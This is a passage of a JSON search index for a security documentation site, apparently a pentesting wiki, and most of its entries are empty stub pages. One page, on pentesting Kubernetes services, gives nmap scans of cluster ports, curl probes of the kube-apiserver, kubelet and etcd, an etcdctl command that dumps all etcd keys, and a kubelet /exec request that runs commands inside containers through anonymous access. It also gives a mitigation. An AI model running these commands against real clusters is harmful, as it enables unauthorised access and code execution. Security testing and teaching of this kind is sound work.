\u00b6","title":"Namespaces"},{"location":"content/en/docs/hack/docker/namespaces/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/docker/namespaces/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/docker/namespaces/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/docker/namespaces/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/docker/namespaces/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/docker/namespaces/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/docker/release_agent-exploit-relative-paths-to-pids/","tags":["linux","docker"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Release agent exploit relative paths to pids"},{"location":"content/en/docs/hack/docker/release_agent-exploit-relative-paths-to-pids/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/docker/release_agent-exploit-relative-paths-to-pids/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/docker/release_agent-exploit-relative-paths-to-pids/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/docker/release_agent-exploit-relative-paths-to-pids/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/docker/release_agent-exploit-relative-paths-to-pids/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/docker/release_agent-exploit-relative-paths-to-pids/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/docker/seccomp/","tags":["linux","docker"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Seccomp"},{"location":"content/en/docs/hack/docker/seccomp/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/docker/seccomp/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/docker/seccomp/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/docker/seccomp/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/docker/seccomp/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/docker/seccomp/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/docker/sensitive-mounts/","tags":["linux","docker"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Sensitive mounts"},{"location":"content/en/docs/hack/docker/sensitive-mounts/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/docker/sensitive-mounts/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/docker/sensitive-mounts/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/docker/sensitive-mounts/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/docker/sensitive-mounts/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/docker/sensitive-mounts/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/kubernetes/abusing-roles-clusterroles-in-kubernetes/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Abusing roles clusterroles in kubernetes"},{"location":"content/en/docs/hack/kubernetes/abusing-roles-clusterroles-in-kubernetes/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/kubernetes/abusing-roles-clusterroles-in-kubernetes/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/kubernetes/abusing-roles-clusterroles-in-kubernetes/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/kubernetes/abusing-roles-clusterroles-in-kubernetes/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/kubernetes/abusing-roles-clusterroles-in-kubernetes/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/kubernetes/abusing-roles-clusterroles-in-kubernetes/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/kubernetes/attacking-kubernetes-from-inside-a-pod/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Attacking kubernetes from inside a pod"},{"location":"content/en/docs/hack/kubernetes/attacking-kubernetes-from-inside-a-pod/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/kubernetes/attacking-kubernetes-from-inside-a-pod/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/kubernetes/attacking-kubernetes-from-inside-a-pod/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/kubernetes/attacking-kubernetes-from-inside-a-pod/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/kubernetes/attacking-kubernetes-from-inside-a-pod/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/kubernetes/attacking-kubernetes-from-inside-a-pod/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/kubernetes/exposing-services-in-kubernetes/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Exposing services in kubernetes"},{"location":"content/en/docs/hack/kubernetes/exposing-services-in-kubernetes/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/kubernetes/exposing-services-in-kubernetes/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/kubernetes/exposing-services-in-kubernetes/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/kubernetes/exposing-services-in-kubernetes/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/kubernetes/exposing-services-in-kubernetes/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/kubernetes/exposing-services-in-kubernetes/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/kubernetes/kubernetes-access-to-other-clouds/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Kubernetes access to other clouds"},{"location":"content/en/docs/hack/kubernetes/kubernetes-access-to-other-clouds/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/kubernetes/kubernetes-access-to-other-clouds/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/kubernetes/kubernetes-access-to-other-clouds/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/kubernetes/kubernetes-access-to-other-clouds/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/kubernetes/kubernetes-access-to-other-clouds/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/kubernetes/kubernetes-access-to-other-clouds/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/kubernetes/kubernetes-enumeration/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Kubernetes enumeration"},{"location":"content/en/docs/hack/kubernetes/kubernetes-enumeration/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/kubernetes/kubernetes-enumeration/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/kubernetes/kubernetes-enumeration/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/kubernetes/kubernetes-enumeration/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/kubernetes/kubernetes-enumeration/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/kubernetes/kubernetes-enumeration/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/kubernetes/kubernetes-namespace-escalation/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Kubernetes namespace escalation"},{"location":"content/en/docs/hack/kubernetes/kubernetes-namespace-escalation/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/kubernetes/kubernetes-namespace-escalation/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/kubernetes/kubernetes-namespace-escalation/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/kubernetes/kubernetes-namespace-escalation/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/kubernetes/kubernetes-namespace-escalation/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/kubernetes/kubernetes-namespace-escalation/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/kubernetes/kubernetes-network-attacks/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Kubernetes network attacks"},{"location":"content/en/docs/hack/kubernetes/kubernetes-network-attacks/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/kubernetes/kubernetes-network-attacks/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/kubernetes/kubernetes-network-attacks/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/kubernetes/kubernetes-network-attacks/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/kubernetes/kubernetes-network-attacks/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/kubernetes/kubernetes-network-attacks/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/kubernetes/kubernetes-role-based-access-control/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Kubernetes role based access control"},{"location":"content/en/docs/hack/kubernetes/kubernetes-role-based-access-control/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/kubernetes/kubernetes-role-based-access-control/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/kubernetes/kubernetes-role-based-access-control/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/kubernetes/kubernetes-role-based-access-control/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/kubernetes/kubernetes-role-based-access-control/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/kubernetes/kubernetes-role-based-access-control/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6 Pentesting Kubernetes Services \u00b6 Finding exposed pods with OSINT \u00b6 One way could be searching for Identity LIKE \"k8s.%.com\" in crt.sh to find subdomains related to kubernetes. Another way might be to search \"k8s.%.com\" in github and search for YAML files containing the string. How Kubernetes Exposes Services \u00b6 It might be useful for us to understand how Kubernetes can expose services publicly in order to find them: Exposing Services in Kubernetes Finding Exposed pods via port scanning \u00b6 The following ports might be open in Kubernetes cluster: Port Process Description Protocol 2379 etcd TCP 6666 etcd etcd TCP 4194 cAdvisor Container metrics TCP 443 kube-apiserver Kubernetes API port TCP 6443 kube-apiserver Kubernetes API port TCP 8443 kube-apiserver Minukube API port TCP 8080 kube-apiserver Insecure API port TCP 10250 kubelet HTTPS API which allows full mode access TCP 10255 kubelet Unauthenticated read-only HTTP port: pods, running pods, and node state TCP 10256 kube-proxy Kube Proxy health check server TCP 9099 calico-felix Health check server for Calico TCP 6782-6784 weave Metrics and endpoints TCP 30000-32767 NodePort Proxy to the services TCP 44134 Tiller Helm service listening TCP Nmap \u00b6 Example Syntax 1 nmap -n -T4 -p 443 ,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 10 .244.0.137/16 1 nmap -n -T4 -p 443 ,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16 Kube-apiserver \u00b6 This is the API Kubernetes service the administrator talks with usually using the tool kubeclt . Common ports: 6443 and 443 , but also 8443 in minikube and 8080 as insecure. Syntax Example 443 Example 6443 Example 8443 Example 8080 1 2 3 curl -k https://<IP Address>: ( 8 | 6 ) 443 /swaggerapi curl -k https://<IP Address>: ( 8 | 6 ) 443 /healthz curl -k https://<IP Address>: ( 8 | 6 ) 443 /api/v1 1 2 3 curl -k https://127.0.0.1:443/swaggerapi curl -k https://127.0.0.1:443/healthz curl -k https://127.0.0.1:443/api/v1 1 2 3 curl -k https://127.0.0.1:6443/swaggerapi curl -k https://127.0.0.1:6443/healthz curl -k https://127.0.0.1:6443/api/v1 1 2 3 curl -k https://127.0.0.1:8443/swaggerapi curl -k https://127.0.0.1:8443/healthz curl -k https://127.0.0.1:8443/api/v1 1 2 3 curl -k https://127.0.0.1:8080/swaggerapi curl -k https://127.0.0.1:8080/healthz curl -k https://127.0.0.1:8080/api/v1 Check the following page to learn how to obtain sensitive data and perform sensitive actions talking to this service: Kubernetes Enumeration Kubelet API \u00b6 This service run in every node of the cluster . It's the service that will control the pods inside the node . It talks with the kube-apiserver . If we find this service exposed we might have found and unauthenticated RCE Kubelet API \u00b6 Example Syntax 1 2 curl -k https://127.0.0.1:10250/metrics curl -k https://127.0.0.1:10250/pods 1 2 curl -k https://<IP address>:10250/metrics curl -k https://<IP address>:10250/pods If the response is Unauthorized then it requires authentication. If we can list nodes we can get a list of kubelets endpoints with: 1 2 3 4 5 6 kubectl get nodes -o custom-columns = 'IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS = '' read -r node ; do ip = $( echo $node | awk '{print $1}' ) port = $( echo $node | awk '{print $2}' ) echo \"curl -k --max-time 30 https:// $ip : $port /pods\" echo \"curl -k --max-time 30 https:// $ip :2379/version\" #Check also for etcd done Kubeket (Read only) \u00b6 Example Syntax 1 2 curl -k https://127.0.0.1:10255 http://111.0.0.1:10255/pods 1 2 curl -k https://<IP Address>:10255 http://<external-IP>:10255/pods etcd API \u00b6 Example Syntax 1 2 3 curl -k https://127.0.0.1:2379 curl -k https://127.0.0.1:2379/version etcdctl --endpoints = http://127.0.0.1:2379 get / --prefix --keys-only 1 2 3 curl -k https://<IP address>:2379 curl -k https://<IP address>:2379/version etcdctl --endpoints = http://<MASTER-IP>:2379 get / --prefix --keys-only Tiller \u00b6 1 helm --host tiller-deploy.kube-system:44134 version We could abuse this service to escalte privileges inside Kubernetes: 44134 - Pentesting Tiller (Helm) cAdvisor \u00b6 Example Syntax 1 curl -k https://127.0.0.1:4194 1 curl -k https://<IP Address>:4194 NodePort \u00b6 When a port is exposed in all the nodes via a NodePort , the same port is opened in all the nodes proxifying the traffic into the declared Service . By default this port will be in the range 30000 - 32767 . So new unchecked services might be accessible through those ports. Example Syntax 1 sudo nmap -sS -p 30000 -32767 127 .0.0.1 1 sudo nmap -sS -p 30000 -32767 <IP> --- ## Vulnerable Misconfigurations ### Kube-apiserver Anonymous Access By **default**, **kube-apiserver** API endpoints are **forbidden** to **anonymous** access. But it's always a good idea to check if there are any **insecure endpoints that expose sensitive information** ![Screenshot](img/kube-pen-fig-1.png) ### Checking for ETCD Anonymous Access The ETCD stores the cluster secrets, configuration files and more **sensitive data**. By **default**, the ETCD **cannot** be accessed **anonymously**, but it always good to check. If the ETCD can be accessed anonymously, you may need to **use the [etcdctl](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md) tool**. The following command will get all the keys stored: === \"Example\" ```{ .sh .annotate linenums=\"1\"} etcdctl --endpoints=http://127.0.0.1:2379 get / --prefix --keys-only ``` === \"Syntax\" ```{ .sh .annotate linenums=\"1\"} etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only ``` ### Kubelet RCE The **[Kubelet documentation](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)** explains that by **default anonymous access** to the service is **allowed**: ```{ .sh .annotate linenums=\"1\"} --anonymous-auth Default: true Enables anonymous requests to the Kubelet server. Requests that are not rejected by another authentication method are treated as anonymous requests. Anonymous requests have a username of system:anonymous, and a group name of system:unauthenticated. (DEPRECATED: This parameter should be set via the config file specified by the Kubelet's --config flag. See kubelet-config-file for more information.) The Kubelet service API is not documented , but the source code can be found here and finding the exposed endpoints is as easy as running : Example Syntax 1 curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path(\"/' 1 curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path(\"/' Expected output 1 2 3 4 5 6 7 Path ( \"/pods\" ) . Path ( \"/run\" ) Path ( \"/exec\" ) Path ( \"/attach\" ) Path ( \"/portForward\" ) Path ( \"/containerLogs\" ) Path ( \"/runningpods/\" ) . All of them sounds interesting. /pods \u00b6 This endpoint list pods and their containers: Example Syntax 1 curl -ks https://worker:10250/pod 1 curl -ks https://worker:10250/pods Expected output 1 /exec \u00b6 This endpoint allows to execute code inside any container very easily: Syntax Example 1 2 3 4 # Tthe command is passed as an array (split by spaces) and that is a GET request. curl -Gks https://worker:10250/exec/ { namespace } / { pod } / { container } \\ -d 'input=1' -d 'output=1' -d 'tty=1' \\ -d 'command=ls' -d 'command=/' 1 2 3 4 # Tthe command is passed as an array (split by spaces) and that is a GET request. curl -Gks https://worker:10250/exec/ { namespace } / { pod } / { container } \\ -d 'input=1' -d 'output=1' -d 'tty=1' \\ -d 'command=ls' -d 'command=/' Expected output 1 To automate the exploitation you can also use the script kubelet-anon-rce Info To avoid this attack the kubelet service should be run with --anonymous-auth false and the service should be segregated at the network level. Checking Kubelet (Read Only Port) Information Exposure \u00b6","title":"Pentesting kubernetes services"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#pentesting-kubernetes-services","text":"","title":"Pentesting Kubernetes Services"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#finding-exposed-pods-with-osint","text":"One way could be searching for Identity LIKE \"k8s.%.com\" in crt.sh to find subdomains related to kubernetes. Another way might be to search \"k8s.%.com\" in github and search for YAML files containing the string.","title":"Finding exposed pods with OSINT"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#how-kubernetes-exposes-services","text":"It might be useful for us to understand how Kubernetes can expose services publicly in order to find them: Exposing Services in Kubernetes","title":"How Kubernetes Exposes Services"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#finding-exposed-pods-via-port-scanning","text":"The following ports might be open in Kubernetes cluster: Port Process Description Protocol 2379 etcd TCP 6666 etcd etcd TCP 4194 cAdvisor Container metrics TCP 443 kube-apiserver Kubernetes API port TCP 6443 kube-apiserver Kubernetes API port TCP 8443 kube-apiserver Minukube API port TCP 8080 kube-apiserver Insecure API port TCP 10250 kubelet HTTPS API which allows full mode access TCP 10255 kubelet Unauthenticated read-only HTTP port: pods, running pods, and node state TCP 10256 kube-proxy Kube Proxy health check server TCP 9099 calico-felix Health check server for Calico TCP 6782-6784 weave Metrics and endpoints TCP 30000-32767 NodePort Proxy to the services TCP 44134 Tiller Helm service listening TCP","title":"Finding Exposed pods via port scanning"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#nmap","text":"Example Syntax 1 nmap -n -T4 -p 443 ,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 10 .244.0.137/16 1 nmap -n -T4 -p 443 ,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16","title":"Nmap"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#kube-apiserver","text":"This is the API Kubernetes service the administrator talks with usually using the tool kubeclt . Common ports: 6443 and 443 , but also 8443 in minikube and 8080 as insecure. Syntax Example 443 Example 6443 Example 8443 Example 8080 1 2 3 curl -k https://<IP Address>: ( 8 | 6 ) 443 /swaggerapi curl -k https://<IP Address>: ( 8 | 6 ) 443 /healthz curl -k https://<IP Address>: ( 8 | 6 ) 443 /api/v1 1 2 3 curl -k https://127.0.0.1:443/swaggerapi curl -k https://127.0.0.1:443/healthz curl -k https://127.0.0.1:443/api/v1 1 2 3 curl -k https://127.0.0.1:6443/swaggerapi curl -k https://127.0.0.1:6443/healthz curl -k https://127.0.0.1:6443/api/v1 1 2 3 curl -k https://127.0.0.1:8443/swaggerapi curl -k https://127.0.0.1:8443/healthz curl -k https://127.0.0.1:8443/api/v1 1 2 3 curl -k https://127.0.0.1:8080/swaggerapi curl -k https://127.0.0.1:8080/healthz curl -k https://127.0.0.1:8080/api/v1 Check the following page to learn how to obtain sensitive data and perform sensitive actions talking to this service: Kubernetes Enumeration","title":"Kube-apiserver"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#kubelet-api","text":"This service run in every node of the cluster . It's the service that will control the pods inside the node . It talks with the kube-apiserver . If we find this service exposed we might have found and unauthenticated RCE","title":"Kubelet API"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#kubelet-api_1","text":"Example Syntax 1 2 curl -k https://127.0.0.1:10250/metrics curl -k https://127.0.0.1:10250/pods 1 2 curl -k https://<IP address>:10250/metrics curl -k https://<IP address>:10250/pods If the response is Unauthorized then it requires authentication. If we can list nodes we can get a list of kubelets endpoints with: 1 2 3 4 5 6 kubectl get nodes -o custom-columns = 'IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS = '' read -r node ; do ip = $( echo $node | awk '{print $1}' ) port = $( echo $node | awk '{print $2}' ) echo \"curl -k --max-time 30 https:// $ip : $port /pods\" echo \"curl -k --max-time 30 https:// $ip :2379/version\" #Check also for etcd done","title":"Kubelet API"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#kubeket-read-only","text":"Example Syntax 1 2 curl -k https://127.0.0.1:10255 http://111.0.0.1:10255/pods 1 2 curl -k https://<IP Address>:10255 http://<external-IP>:10255/pods","title":"Kubeket (Read only)"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#etcd-api","text":"Example Syntax 1 2 3 curl -k https://127.0.0.1:2379 curl -k https://127.0.0.1:2379/version etcdctl --endpoints = http://127.0.0.1:2379 get / --prefix --keys-only 1 2 3 curl -k https://<IP address>:2379 curl -k https://<IP address>:2379/version etcdctl --endpoints = http://<MASTER-IP>:2379 get / --prefix --keys-only","title":"etcd API"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#tiller","text":"1 helm --host tiller-deploy.kube-system:44134 version We could abuse this service to escalte privileges inside Kubernetes: 44134 - Pentesting Tiller (Helm)","title":"Tiller"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#cadvisor","text":"Example Syntax 1 curl -k https://127.0.0.1:4194 1 curl -k https://<IP Address>:4194","title":"cAdvisor"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#nodeport","text":"When a port is exposed in all the nodes via a NodePort , the same port is opened in all the nodes proxifying the traffic into the declared Service . By default this port will be in the range 30000 - 32767 . So new unchecked services might be accessible through those ports. Example Syntax 1 sudo nmap -sS -p 30000 -32767 127 .0.0.1 1 sudo nmap -sS -p 30000 -32767 <IP> --- ## Vulnerable Misconfigurations ### Kube-apiserver Anonymous Access By **default**, **kube-apiserver** API endpoints are **forbidden** to **anonymous** access. But it's always a good idea to check if there are any **insecure endpoints that expose sensitive information** ![Screenshot](img/kube-pen-fig-1.png) ### Checking for ETCD Anonymous Access The ETCD stores the cluster secrets, configuration files and more **sensitive data**. By **default**, the ETCD **cannot** be accessed **anonymously**, but it always good to check. If the ETCD can be accessed anonymously, you may need to **use the [etcdctl](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md) tool**. The following command will get all the keys stored: === \"Example\" ```{ .sh .annotate linenums=\"1\"} etcdctl --endpoints=http://127.0.0.1:2379 get / --prefix --keys-only ``` === \"Syntax\" ```{ .sh .annotate linenums=\"1\"} etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only ``` ### Kubelet RCE The **[Kubelet documentation](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)** explains that by **default anonymous access** to the service is **allowed**: ```{ .sh .annotate linenums=\"1\"} --anonymous-auth Default: true Enables anonymous requests to the Kubelet server. Requests that are not rejected by another authentication method are treated as anonymous requests. Anonymous requests have a username of system:anonymous, and a group name of system:unauthenticated. (DEPRECATED: This parameter should be set via the config file specified by the Kubelet's --config flag. See kubelet-config-file for more information.) The Kubelet service API is not documented , but the source code can be found here and finding the exposed endpoints is as easy as running : Example Syntax 1 curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path(\"/' 1 curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path(\"/' Expected output 1 2 3 4 5 6 7 Path ( \"/pods\" ) . Path ( \"/run\" ) Path ( \"/exec\" ) Path ( \"/attach\" ) Path ( \"/portForward\" ) Path ( \"/containerLogs\" ) Path ( \"/runningpods/\" ) . All of them sounds interesting.","title":"NodePort"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#pods","text":"This endpoint list pods and their containers: Example Syntax 1 curl -ks https://worker:10250/pod 1 curl -ks https://worker:10250/pods Expected output 1","title":"/pods"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#exec","text":"This endpoint allows to execute code inside any container very easily: Syntax Example 1 2 3 4 # Tthe command is passed as an array (split by spaces) and that is a GET request. curl -Gks https://worker:10250/exec/ { namespace } / { pod } / { container } \\ -d 'input=1' -d 'output=1' -d 'tty=1' \\ -d 'command=ls' -d 'command=/' 1 2 3 4 # Tthe command is passed as an array (split by spaces) and that is a GET request. curl -Gks https://worker:10250/exec/ { namespace } / { pod } / { container } \\ -d 'input=1' -d 'output=1' -d 'tty=1' \\ -d 'command=ls' -d 'command=/' Expected output 1 To automate the exploitation you can also use the script kubelet-anon-rce Info To avoid this attack the kubelet service should be run with --anonymous-auth false and the service should be segregated at the network level.","title":"/exec"},{"location":"content/en/docs/hack/kubernetes/pentesting-kubernetes-services/#checking-kubelet-read-only-port-information-exposure","text":"","title":"Checking Kubelet (Read Only Port) Information Exposure"},{"location":"content/en/docs/hack/linux/checklist-linux-privilege-escalation/","tags":["linux"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Checklist linux privilege escalation"},{"location":"content/en/docs/hack/linux/checklist-linux-privilege-escalation/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/linux/checklist-linux-privilege-escalation/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/linux/checklist-linux-privilege-escalation/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/linux/checklist-linux-privilege-escalation/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/linux/checklist-linux-privilege-escalation/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/linux/checklist-linux-privilege-escalation/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/linux/ddexec/","tags":["linux"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Ddexec"},{"location":"content/en/docs/hack/linux/ddexec/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/linux/ddexec/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/linux/ddexec/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/linux/ddexec/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/linux/ddexec/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/linux/ddexec/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/linux/linux-capabilities/","tags":["linux"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Linux capabilities"},{"location":"content/en/docs/hack/linux/linux-capabilities/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/linux/linux-capabilities/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/linux/linux-capabilities/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/linux/linux-capabilities/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/linux/linux-capabilities/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/linux/linux-capabilities/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/linux/linux-environment-variables/","tags":["linux"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Linux environment 